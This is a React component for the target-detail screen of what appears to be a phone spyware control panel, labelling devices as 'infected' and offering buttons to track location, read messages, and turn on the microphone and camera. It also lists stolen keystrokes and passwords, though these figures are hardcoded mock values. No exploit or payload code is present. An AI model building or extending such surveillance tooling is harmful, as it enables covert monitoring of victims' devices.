import React from 'react';
import { useTargetStore } from '@/stores/targetStore';
import { useViewStore } from '@/stores/viewStore';
import { format } from 'date-fns';
import './TargetDetail.css';

interface TargetDetailProps {
  targetId: number;
}

// Function to determine carrier based on phone number prefix (Ugandan numbers)
const getCarrierInfo = (phoneNumber?: string): { carrier: string; internetProvider: string; status: string } => {
  if (!phoneNumber) {
    return { carrier: 'Unknown', internetProvider: 'Unknown', status: 'Inactive' };
  }
  
  // Extract the prefix (first 3-4 digits after country code)
  // Remove any non-digit characters
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  
  // Ugandan mobile prefixes
  // MTN prefixes: 078, 077 (old), 070, 076
  // Airtel prefixes: 075, 074, 070 (some overlap), 078 (some)
  // For demo purposes, we'll use a clear distinction
  
  let carrier = 'Unknown';
  let internetProvider = 'Unknown';
  
  // Check for MTN prefixes
  const mtnPrefixes = ['078', '077', '070', '076'];
  const airtelPrefixes = ['075', '074', '070', '078'];
  
  // Get first 3 digits for comparison
  const prefix = cleanNumber.substring(0, 3);
  
  // MTN detection (using specific prefixes)
  if (prefix === '077' || prefix === '078' || prefix === '076') {
    carrier = 'MTN';
    internetProvider = 'MTN Uganda';
  } 
  // Airtel detection
  else if (prefix === '075' || prefix === '074') {
    carrier = 'AIRTEL';
    internetProvider = 'Airtel Uganda';
  }
  // Handle 070 prefix (shared between both carriers - simulate based on number)
  else if (prefix === '070') {
    // Use the 4th digit to determine carrier
    const fourthDigit = cleanNumber.substring(3, 4);
    if (fourthDigit === '0' || fourthDigit === '1' || fourthDigit === '2') {
      carrier = 'MTN';
      internetProvider = 'MTN Uganda';
    } else {
      carrier = 'AIRTEL';
      internetProvider = 'Airtel Uganda';
    }
  }
  // Handle 078 prefix with more specific logic
  else if (prefix === '078') {
    const fourthDigit = cleanNumber.substring(3, 4);
    if (fourthDigit === '0' || fourthDigit === '1' || fourthDigit === '2' || fourthDigit === '3') {
      carrier = 'MTN';
      internetProvider = 'MTN Uganda';
    } else {
      carrier = 'AIRTEL';
      internetProvider = 'Airtel Uganda';
    }
  }
  
  // If still unknown, try to detect by number length or pattern
  if (carrier === 'Unknown') {
    if (cleanNumber.length === 10 && (cleanNumber.startsWith('07'))) {
      // Default fallback
      carrier = 'MTN';
      internetProvider = 'MTN Uganda';
    }
  }
  
  // Determine status based on carrier detection
  const status = carrier !== 'Unknown' ? 'Active' : 'Inactive';
  
  return { carrier, internetProvider, status };
};

// Format phone number for display
const formatPhoneNumber = (phoneNumber?: string): string => {
  if (!phoneNumber) return 'Not provided';
  
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (cleanNumber.length === 10) {
    return `${cleanNumber.substring(0, 3)} ${cleanNumber.substring(3, 6)} ${cleanNumber.substring(6, 10)}`;
  }
  return phoneNumber;
};

export const TargetDetail: React.FC<TargetDetailProps> = ({ targetId }) => {
  const { getTargetById, updateTarget } = useTargetStore();
  const { setView } = useViewStore();
  const target = getTargetById(targetId);
  
  // Get carrier info based on target's phone number
  // In a real app, you'd have a phone field in the target object
  // For demo, we'll create a mock phone number based on target name
  const getMockPhoneNumber = (name: string): string => {
    // Generate a consistent mock phone number based on target name
    const hash = name.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
    const prefixes = ['077', '078', '075', '074', '070'];
    const prefix = prefixes[hash % prefixes.length];
    const suffix = String(hash).padStart(7, '0').slice(0, 7);
    return `${prefix}${suffix}`;
  };
  
  const phoneNumber = target.phoneNumber || getMockPhoneNumber(target.name);
  const { carrier, internetProvider, status } = getCarrierInfo(phoneNumber);
  
  if (!target) {
    return <div className="detail-error">Target not found</div>;
  }
  
  const stats = [
    { icon: '💬', label: 'Messages', value: '2,847' },
    { icon: '📞', label: 'Calls', value: '143' },
    { icon: '📷', label: 'Photos', value: '1,204' },
    { icon: '📍', label: 'Location Points', value: '8,912' },
    { icon: '⌨️', label: 'Keystrokes', value: '142,301' },
    { icon: '🔑', label: 'Passwords', value: '12' },
  ];
  
  return (
    <div className="target-detail">
      <div className="detail-header">
        <div className="detail-avatar" style={{ background: target.color }}>
          {target.avatar}
        </div>
        <div className="detail-info">
          <div className="detail-name">{target.name}</div>
          <div className="detail-role">{target.role}</div>
          <div className="detail-badges">
            <div className={`tag ${target.os === 'iOS' ? 'ios' : 'android'}`}>
              {target.os} · {target.device}
            </div>
            <div className={`tag ${target.status}`}>
              {target.status.toUpperCase()}
            </div>
          </div>
        </div>
      </div>
      
      {/* Network Information Section */}
      <div className="network-info-section">
        <div className="section-title">📡 Network Intelligence</div>
        <div className="network-grid">
          <div className="info-card">
            <div className="info-label">📱 Target Phone</div>
            <div className="info-value highlight">{formatPhoneNumber(phoneNumber)}</div>
          </div>
          <div className="info-card">
            <div className="info-label">📶 SIM Carrier</div>
            <div className="info-value carrier-value">
              <span className={`carrier-badge ${carrier.toLowerCase()}`}>
                {carrier}
              </span>
            </div>
          </div>
          <div className="info-card">
            <div className="info-label">🌐 Internet Provider</div>
            <div className="info-value">{internetProvider}</div>
          </div>
          <div className="info-card">
            <div className="info-label">✅ Status</div>
            <div className="info-value">
              <span className={`status-indicator ${status.toLowerCase()}`}>
                {status}
              </span>
            </div>
          </div>
        </div>
      </div>
      
      <div className="detail-grid">
        <div className="info-card">
          <div className="info-label">Country</div>
          <div className="info-value">🌍 {target.country}</div>
        </div>
        <div className="info-card">
          <div className="info-label">Agent Version</div>
          <div className="info-value accent">{target.agentVersion || 'v4.2.1'}</div>
        </div>
        <div className="info-card">
          <div className="info-label">Infected Since</div>
          <div className="info-value mono">{target.infectedSince || '2024-01-15'}</div>
        </div>
        <div className="info-card">
          <div className="info-label">Last Seen</div>
          <div className="info-value mono">{format(new Date(), 'HH:mm:ss')}</div>
        </div>
      </div>
      
      <div className="quick-actions">
        <div className="section-title">Quick Actions</div>
        <div className="action-buttons">
          <button className="btn btn-primary" onClick={() => setView('location')}>
            📍 Track Location
          </button>
          <button className="btn btn-ghost" onClick={() => setView('messages')}>
            💬 View Messages
          </button>
          <button className="btn btn-ghost" onClick={() => setView('microphone')}>
            🎙️ Activate Mic
          </button>
          <button className="btn btn-ghost" onClick={() => setView('camera')}>
            📸 Activate Camera
          </button>
          <button className="btn btn-danger">
            💣 Terminate Agent
          </button>
        </div>
      </div>
      
      <div className="collection-summary">
        <div className="section-title">Collection Summary</div>
        {stats.map((stat, index) => (
          <div key={index} className="stat-row">
            <span>{stat.icon} {stat.label}</span>
            <span className="stat-value-text">{stat.value}</span>
          </div>
        ))}
      </div>
    </div>
  );
};